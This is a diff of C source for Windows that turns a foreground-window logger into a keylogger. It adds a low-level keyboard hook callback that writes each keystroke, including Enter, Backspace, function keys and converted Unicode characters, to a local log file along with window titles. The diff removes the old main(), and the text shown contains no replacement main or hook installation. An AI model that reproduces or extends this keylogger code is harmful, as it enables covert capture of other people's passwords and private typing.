@@ -2,6 +2,8 @@
 
 HANDLE fd = NULL;
 
+HHOOK hKeyboardHook = NULL;
+
 int	write_to_file(char *str)
 {
 	if (fd == NULL)
@@ -42,7 +44,7 @@ char	*GetDateFormated(void)
 	return dateStr;
 }
 
-void CALLBACK WinEvent(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
+void CALLBACK WinForeground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
 	DWORD event, // Event type
 	HWND hwnd, // Handle to the window that generated the event
 	LONG idObject,	 // Object identifier
@@ -75,37 +77,79 @@ void CALLBACK WinEvent(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
 		}
 		windowTitle[i] = '\0';
 		char logEntry[512];
-		sprintf_s(logEntry, sizeof(logEntry), "[%s] - Foreground window title: %s\n", dateStr, windowTitle);
+		sprintf_s(logEntry, sizeof(logEntry), "\n[%s] - Foreground window title: %s\n", dateStr, windowTitle);
 		write_to_file(logEntry);
 		free(dateStr);
 	}
-	// TODO Event KeyPress
+
 }
 
-int	main(void)
+
+LRESULT CALLBACK LowLevelKeyboardProc(
+	_In_ int    nCode,
+	_In_ WPARAM wParam,
+	_In_ LPARAM lParam
+)
 {
-	fd = CreateFileA("logs.txt", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
-		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-
-	if (fd != INVALID_HANDLE_VALUE)
-		SetFilePointer(fd, 0, NULL, FILE_END);
-	else
-		return 1;
-
-	HWINEVENTHOOK hook = SetWinEventHook(
-		EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
-		NULL,
-		WinEvent,
-		0, 0,
-		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
-	if (hook == NULL)
+	if (nCode >= 0)
 	{
-		printf("Failed to set hook: %lu\n", GetLastError());
-		return 1;
+		KBDLLHOOKSTRUCT* keyboardHookPtr = (KBDLLHOOKSTRUCT*)lParam;
+		DWORD	keyCode = keyboardHookPtr->vkCode;
+		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+		{
+			char logEntry[64];
+			if (keyCode == VK_ESCAPE)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[ESC]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_RETURN)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[ENTER]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_SPACE)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), " ");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_BACK)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[BACKSPACE]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_CAPITAL)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[CAPS]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode >= VK_F1 && keyCode <= VK_F24)
+			{
+				DWORD functionKeyNumber = keyCode - VK_F1 + 1;
+				sprintf_s(logEntry, sizeof(logEntry), "[F%lu]", (unsigned long)functionKeyNumber);
+				write_to_file(logEntry);
+			}
+			else
+			{
+				// Convert virtual key to Unicode character
+				BYTE keyboardState[256];
+				GetKeyboardState(keyboardState);
+				
+				WCHAR unicodeBuffer[5];
+				int result = ToUnicode(keyCode, keyboardHookPtr->scanCode, keyboardState, unicodeBuffer, 4, 0);
+				
+				if (result > 0)
+				{
+					unicodeBuffer[result] = L'\0';
+					char utf8Buffer[16];
+					int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, -1, utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
+					if (bytesWritten > 0)
+					{
+						write_to_file(utf8Buffer);
+					}
+				}
+			}
+		}
 	}
-	MSG msg;
-	while (GetMessage(&msg, NULL, 0, 0))
-		;
-	UnhookWinEvent(hook);
-	return 0;
+	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
 }
